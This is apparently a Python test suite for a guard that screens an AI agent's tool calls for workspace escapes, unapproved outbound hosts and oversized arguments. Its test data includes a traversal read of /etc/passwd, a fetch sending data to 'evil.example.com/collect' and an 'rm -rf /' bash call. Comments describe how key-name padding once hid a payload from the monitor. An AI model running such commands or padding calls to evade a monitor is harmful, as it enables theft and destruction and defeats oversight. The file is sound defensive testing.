"""Tests for the agentic tool guard (backend/services/tool_policy.py) and the
fail-open/fail-closed behavior of the /api/toolguard/inspect decision path.

Standalone (no pytest required), mirroring tests/test_executive_fields.py:
    venv/bin/python tests/test_tool_guard.py
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import backend.config  # noqa: F401  (sets SSL_CERT_FILE / loads .env)
from backend.config import settings
from backend.services import tool_policy

_failures = []


def check(name, cond, detail=""):
    status = "PASS" if cond else "FAIL"
    print(f"[{status}] {name}" + (f" :: {detail}" if detail and not cond else ""))
    if not cond:
        _failures.append(name)


# Pin a known policy config for deterministic assertions, restoring after.
_saved = {
    "roots": settings.tool_guard_workspace_roots,
    "sensitive": settings.tool_guard_sensitive_tools,
    "egress": settings.tool_guard_egress_allow_hosts,
    "maxchars": settings.tool_guard_max_arg_chars,
}
settings.tool_guard_workspace_roots = "/home/node/.openclaw/workspace,/tmp"
settings.tool_guard_sensitive_tools = "exec,bash,write,edit,web_fetch,browser,message"
settings.tool_guard_egress_allow_hosts = "127.0.0.1:8001,localhost:8001"
settings.tool_guard_max_arg_chars = 4000

# 1. Benign read inside the workspace -> allow, not sensitive ----------------
v = tool_policy.evaluate("read", {"path": "/home/node/.openclaw/workspace/inbox/note.md"})
check("read: not blocked", v.should_block is False, str(v.reasons))
check("read: not sensitive", v.sensitive is False)

# 2. Read escaping the workspace -> blocked (containment) --------------------
v = tool_policy.evaluate("read", {"path": "/home/node/.openclaw/workspace/../../etc/passwd"})
check("escape: blocked", v.should_block is True, str(v.reasons))
check("escape: workspace rule", "Workspace Containment" in v.rule_names, str(v.rule_names))

# 2b. Absolute path outside all roots -> blocked -----------------------------
v = tool_policy.evaluate("read", {"path": "/Applications/DemoBot/.env"})
check("abs-escape: blocked", v.should_block is True, str(v.reasons))

# 3. Egress to an unapproved host -> blocked ---------------------------------
v = tool_policy.evaluate("web_fetch", {"url": "https://evil.example.com/collect", "body": "data"})
check("egress-bad: blocked", v.should_block is True, str(v.reasons))
check("egress-bad: sensitive", v.sensitive is True)
check("egress-bad: egress rule", "Egress Allowlist" in v.rule_names, str(v.rule_names))

# 4. Egress to an approved host (port-insensitive match) -> allowed ----------
v = tool_policy.evaluate("web_fetch", {"url": "http://127.0.0.1:8001/api/toolguard/decoy-sink"})
check("egress-ok: not blocked", v.should_block is False, str(v.reasons))
check("egress-ok: still sensitive", v.sensitive is True)  # escalated to AI Defense

# 5. Sensitive tool with benign args -> not blocked but sensitive ------------
v = tool_policy.evaluate("bash", {"command": "ls /home/node/.openclaw/workspace"})
check("bash: not blocked", v.should_block is False, str(v.reasons))
check("bash: sensitive", v.sensitive is True)

# 6. Argument rendering is truncated to the configured bound -----------------
big = tool_policy.render_tool_call("write", {"content": "A" * 10000})
check("render: truncated to bound", len(big) <= settings.tool_guard_max_arg_chars, str(len(big)))
check("render: names the tool", big.startswith("Agent tool call: write("), big[:40])

# 7. Empty egress allowlist denies all egress by default ---------------------
settings.tool_guard_egress_allow_hosts = ""
v = tool_policy.evaluate("web_fetch", {"url": "http://127.0.0.1:8001/x"})
check("deny-default: blocked with empty allowlist", v.should_block is True, str(v.reasons))
settings.tool_guard_egress_allow_hosts = "127.0.0.1:8001,localhost:8001"

# 8. Never raises on garbage arguments ---------------------------------------
v = tool_policy.evaluate("write", {"nested": {"x": [1, 2, {"y": None}]}, "n": 5})
check("robust: returns a verdict on odd args", isinstance(v, tool_policy.ToolPolicyVerdict))
v = tool_policy.evaluate("", {})
check("robust: empty tool name ok", isinstance(v, tool_policy.ToolPolicyVerdict))

# 9. Fail-open vs fail-closed in the router's AI Defense helper --------------
# The deterministic policy said "allow"; a *sensitive* call is escalated to AI
# Defense. When AI Defense errors, the router honors settings.ai_defense_fail_open.
# We test the router decision logic directly against a stubbed inspection.
import asyncio  # noqa: E402
import backend.routers.toolguard as tg  # noqa: E402


class _ErroredInspection:
    should_block = True   # errored inspections should_block honors fail policy
    errored = True
    rule_names = []
    event_id = None


async def _run_inspect(fail_open: bool):
    saved_fo = settings.ai_defense_fail_open
    saved_enabled = settings.tool_guard_enabled
    saved_aidef = settings.tool_guard_ai_defense
    settings.ai_defense_fail_open = fail_open
    settings.tool_guard_enabled = True
    settings.tool_guard_ai_defense = True

    async def _stub(rendered, enduser_id):
        # Emulate AIDefenseClient: on error, should_block reflects fail policy.
        insp = _ErroredInspection()
        insp.should_block = not fail_open
        return insp

    orig = tg._inspect_ai_defense
    tg._inspect_ai_defense = _stub
    try:
        body = tg.ToolInspectRequest(
            tool_name="web_fetch",
            arguments={"url": "http://127.0.0.1:8001/api/toolguard/decoy-sink"},
            session_id="S-fail", tool_call_id="c1",
        )
        return await tg.inspect_tool_call(body)
    finally:
        tg._inspect_ai_defense = orig
        settings.ai_defense_fail_open = saved_fo
        settings.tool_guard_enabled = saved_enabled
        settings.tool_guard_ai_defense = saved_aidef


resp_closed = asyncio.run(_run_inspect(fail_open=False))
check("fail-closed: blocks on AI Defense error", resp_closed.decision == "block", resp_closed.decision)
check("fail-closed: enforced -> block true", resp_closed.block is True)

resp_open = asyncio.run(_run_inspect(fail_open=True))
check("fail-open: allows on AI Defense error", resp_open.decision == "allow", resp_open.decision)

# 10. Padded arguments cannot push a payload past the truncation bound -------
# json.dumps sorts by key and the agent chooses the key NAMES, so a fat
# early-sorting key used to shove the real payload out of the text the checks
# read — and out of the text submitted to AI Defense. Checks now read the
# untruncated render, so the payload is still visible.
_pad = "A" * (settings.tool_guard_max_arg_chars + 1000)
v = tool_policy.evaluate("read", {"aaa_pad": _pad, "zz_path": "/etc/passwd"})
check("padded: containment still catches the escaped path", v.should_block is True, str(v.reasons))

v = tool_policy.evaluate(
    "web_fetch", {"aaa_pad": _pad, "zz_url": "https://evil.example.com/collect"}
)
check("padded: egress allowlist still catches the host", v.should_block is True, str(v.reasons))
check(
    "padded: rendered stays bounded",
    len(v.rendered) <= settings.tool_guard_max_arg_chars,
    str(len(v.rendered)),
)

# An oversized call is escalated to AI Defense even for a non-sensitive tool:
# AI Defense only ever sees the bounded text, so it must not be possible to
# skip inspection by being too big to inspect.
v = tool_policy.evaluate(
    "read", {"aaa_pad": _pad, "zz_path": "/home/node/.openclaw/workspace/ok.md"}
)
check("padded: oversized call escalated to AI Defense", v.sensitive is True)

# 11. A crash inside evaluate escalates instead of silently allowing ---------
_orig_extract = tool_policy._extract_paths


def _boom(_text):
    raise RuntimeError("synthetic policy failure")


tool_policy._extract_paths = _boom
try:
    v = tool_policy.evaluate("read", {"path": "/home/node/.openclaw/workspace/x.md"})
finally:
    tool_policy._extract_paths = _orig_extract
check("crash: still returns a verdict", isinstance(v, tool_policy.ToolPolicyVerdict))
check("crash: escalated to AI Defense rather than allowed", v.sensitive is True)

# 12. A raising AI Defense inspection yields an ERRORED result, not None -----
# None means "AI Defense not in play" and the caller allows, which ignored
# ai_defense_fail_open. An errored result routes through should_block.
import backend.services.ai_defense as aid  # noqa: E402


class _RaisingClient:
    is_configured = True

    def inspect_prompt(self, *a, **k):
        raise RuntimeError("synthetic inspection failure")


_saved_client = aid.ai_defense_client
_saved_aidef = settings.tool_guard_ai_defense
aid.ai_defense_client = _RaisingClient()
settings.tool_guard_ai_defense = True
try:
    insp = asyncio.run(tg._inspect_ai_defense("Agent tool call: bash(rm -rf /)", "S-raise"))
finally:
    aid.ai_defense_client = _saved_client
    settings.tool_guard_ai_defense = _saved_aidef

check("raise: inspection returns a result, not None", insp is not None)
check("raise: result is marked errored", getattr(insp, "errored", False) is True)

_saved_fo = settings.ai_defense_fail_open
settings.ai_defense_fail_open = False
check("raise: fail-closed blocks", insp.should_block is True)
settings.ai_defense_fail_open = True
check("raise: fail-open allows", insp.should_block is False)
settings.ai_defense_fail_open = _saved_fo

# Restore settings we mutated.
settings.tool_guard_workspace_roots = _saved["roots"]
settings.tool_guard_sensitive_tools = _saved["sensitive"]
settings.tool_guard_egress_allow_hosts = _saved["egress"]
settings.tool_guard_max_arg_chars = _saved["maxchars"]

print()
if _failures:
    print(f"FAILED ({len(_failures)}): {', '.join(_failures)}")
    sys.exit(1)
print("All tool-guard checks passed.")
